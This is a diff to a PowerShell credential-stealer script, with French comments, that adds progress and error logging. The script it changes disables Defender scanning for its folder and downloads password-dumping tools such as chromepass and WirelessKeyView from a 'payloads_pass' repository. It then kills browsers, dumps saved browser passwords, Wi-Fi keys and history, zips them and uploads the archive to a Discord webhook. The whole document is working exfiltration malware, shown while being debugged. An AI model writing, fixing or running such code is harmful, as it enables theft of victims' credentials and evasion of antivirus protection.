@@ -4,22 +4,28 @@ param(
     [string]$WebhookUrl
 )
 
+Write-Host "[*] Script demarre avec succes..." -ForegroundColor Green
+
 $basePath = "C:\Users\Public\Documents\scripts"
 $dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
 $dumpFile = "$dumpFolder.zip"
 
-Add-MpPreference -ExclusionPath $basePath -Force
+Write-Host "[*] Ajout exclusion Defender..." -ForegroundColor Yellow
+Add-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue
 
 New-Item -ItemType Directory -Path $basePath -Force | Out-Null
 New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
 
 # Téléchargement des outils depuis le dépôt GitHub
+Write-Host "[*] Telechargement des outils..." -ForegroundColor Yellow
 try {
     Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WirelessKeyView.exe" -OutFile "$basePath\WirelessKeyView.exe" -ErrorAction Stop
     Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/chromepass.exe" -OutFile "$basePath\chromepass.exe" -ErrorAction Stop
     Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/BrowsingHistoryView.exe" -OutFile "$basePath\BrowsingHistoryView.exe" -ErrorAction Stop
     Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WNetWatcher.exe" -OutFile "$basePath\WNetWatcher.exe" -ErrorAction Stop
+    Write-Host "[+] Outils telecharges avec succes !" -ForegroundColor Green
 } catch {
+    Write-Host "[-] Erreur lors du telechargement des outils : $_" -ForegroundColor Red
     exit 1
 }
 
@@ -27,6 +33,7 @@ Stop-Process -Name "chrome", "msedge", "firefox", "brave" -Force -ErrorAction Si
 Start-Sleep -Seconds 3
 
 # --- EXTRACTION CHROMEPASS AVEC DOSSIER DE TRAVAIL FORCÉ ---
+Write-Host "[*] Lancement de chromepass..." -ForegroundColor Yellow
 $explorer = Get-Process -IncludeUserName | Where-Object {$_.ProcessName -eq "explorer"} | Select-Object -First 1
 
 if ($explorer) {
@@ -66,6 +73,7 @@ Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force
 if (!(Test-Path $dumpFile)) { exit 1 }
 
 # Envoi du fichier ZIP sur le webhook Discord
+Write-Host "[*] Envoi sur Discord..." -ForegroundColor Yellow
 if (-not ("System.Net.Http.HttpClient" -as [type])) {
     $httpPath = Get-ChildItem -Path "C:\Windows\Microsoft.NET\Framework64\" -Recurse -Filter "System.Net.Http.dll" | Select-Object -First 1 -ExpandProperty FullName
     if ($httpPath) { Add-Type -Path $httpPath } else { exit 1 }
@@ -82,7 +90,10 @@ $content.Add($fileContent, "file", [System.IO.Path]::GetFileName("$dumpFile"))
 
 try { 
     $client.PostAsync($WebhookUrl, $content).Wait() 
-} catch {}
+    Write-Host "[+] Envoi reussi !" -ForegroundColor Green
+} catch {
+    Write-Host "[-] Erreur lors de l'envoi Discord : $_" -ForegroundColor Red
+}
 
 $fileStream.Close()
 $fileStream.Dispose()
